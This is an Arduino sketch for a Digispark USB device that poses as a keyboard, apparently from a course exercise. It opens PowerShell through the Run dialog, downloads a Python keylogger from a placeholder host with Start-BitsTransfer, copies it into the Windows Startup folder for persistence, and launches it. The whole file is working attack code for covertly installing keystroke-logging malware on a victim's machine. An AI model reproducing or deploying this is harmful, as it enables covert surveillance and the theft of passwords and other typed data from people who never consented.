#define kbd_tr_tr
#include "DigiKeyboard.h"
void setup() {
}
void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("pip install pynput");
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("Start-BitsTransfer http://[host-ip]/uploads/udemykeylog2.pyw udemykeylog2.pyw");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("cp udemykeylog2.pyw './AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("Start-Process udemykeylog2.pyw");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(20000);
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
